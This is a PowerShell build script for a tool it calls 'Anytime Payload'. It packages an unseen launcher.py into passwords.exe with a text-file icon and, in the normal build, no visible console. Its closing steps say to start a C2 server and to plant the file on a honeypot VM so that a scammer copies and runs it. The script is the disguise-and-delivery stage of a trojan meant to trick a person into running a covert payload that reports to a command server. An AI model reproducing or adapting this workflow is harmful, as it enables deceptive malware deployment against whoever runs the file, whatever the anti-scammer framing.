# Build Anytime Payload
# Generates passwords.txt.exe with text file icon
# Usage: .\build.ps1
#        .\build.ps1 -Dev (builds with visible console for debugging)

param(
    [switch]$Dev
)

if ($Dev) {
    Write-Host ""
    Write-Host "======================================"
    Write-Host "  Anytime Payload Builder (DEV MODE)"
    Write-Host "======================================"
    Write-Host ""
    Write-Host "Building with VISIBLE console for debugging..." -ForegroundColor Yellow
    Write-Host ""
} else {
    Write-Host ""
    Write-Host "======================================"
    Write-Host "  Anytime Payload Builder"
    Write-Host "======================================"
    Write-Host ""
}

# ============================================
# CLEAN PREVIOUS BUILD
# ============================================

if (Test-Path "dist") {
    Write-Host "Cleaning previous build..." -ForegroundColor Cyan
    Remove-Item "dist" -Recurse -Force
    Write-Host "  -> dist/ folder cleaned" -ForegroundColor Gray
}

Write-Host ""

# ============================================
# BUILD .EXE
# ============================================

Write-Host "Building passwords.exe..."
Write-Host ""

# Check required files
if (!(Test-Path "launcher.py")) {
    Write-Host "ERROR: launcher.py not found!" -ForegroundColor Red
    exit 1
}
if (!(Test-Path "icon.ico")) {
    Write-Host "ERROR: icon.ico not found!" -ForegroundColor Red
    exit 1
}

# Find Python
$python = "python"
if (!(Get-Command python -ErrorAction SilentlyContinue)) {
    $python = "python3"
    if (!(Get-Command python3 -ErrorAction SilentlyContinue)) {
        Write-Host "ERROR: Python not found!" -ForegroundColor Red
        exit 1
    }
}

# Check PyInstaller
& $python -m pip show pyinstaller >$null 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Host "  PyInstaller not found. Installing..." -ForegroundColor Yellow
    & $python -m pip install pyinstaller
    if ($LASTEXITCODE -ne 0) {
        Write-Host "ERROR: Failed to install PyInstaller" -ForegroundColor Red
        exit 1
    }
}

# Build with PyInstaller (with or without console depending on dev mode)
if ($Dev) {
    Write-Host "Building with --console flag..." -ForegroundColor Cyan
    & $python -m PyInstaller `
        --onefile `
        --console `
        --icon=icon.ico `
        --name=passwords `
        --clean `
        launcher.py
} else {
    & $python -m PyInstaller `
        --onefile `
        --noconsole `
        --icon=icon.ico `
        --name=passwords `
        --clean `
        launcher.py
}

if ($LASTEXITCODE -ne 0) {
    Write-Host "ERROR: Build failed!" -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "  -> dist\passwords.exe created" -ForegroundColor Green

# Create or remove .dev_mode marker
if ($Dev) {
    New-Item -ItemType File -Path "dist\.dev_mode" -Force | Out-Null
    Write-Host "  -> Created .dev_mode marker" -ForegroundColor Cyan
} else {
    if (Test-Path "dist\.dev_mode") {
        Remove-Item "dist\.dev_mode" -Force
        Write-Host "  -> Removed old .dev_mode marker" -ForegroundColor Gray
    }
}

# Clean up
if (Test-Path "build") { Remove-Item "build" -Recurse -Force }
if (Test-Path "__pycache__") { Remove-Item "__pycache__" -Recurse -Force }
Write-Host "  -> Build artifacts cleaned" -ForegroundColor Gray

# ============================================
# DONE
# ============================================

Write-Host ""
Write-Host "======================================"
if ($Dev) {
    Write-Host "  Dev Build Complete!"
    Write-Host "======================================"
    Write-Host ""
    Write-Host "Dev build created with VISIBLE console." -ForegroundColor Yellow
    Write-Host "Run dist\passwords.exe to see debug output." -ForegroundColor Yellow
} else {
    Write-Host "  Build Complete!"
    Write-Host "======================================"
    Write-Host ""
    Write-Host "Output: dist\passwords.exe"
}
Write-Host ""
Write-Host "Next steps:"
Write-Host "  1. Start C2 server: cd ..\sender && python sender.py"
if ($Dev) {
    Write-Host "  2. Run dist\passwords.exe (console shows debug output)"
} else {
    Write-Host "  2. Deploy dist\passwords.exe to honeypot VM"
    Write-Host "  3. Wait for scammer to copy and execute"
}
Write-Host ""
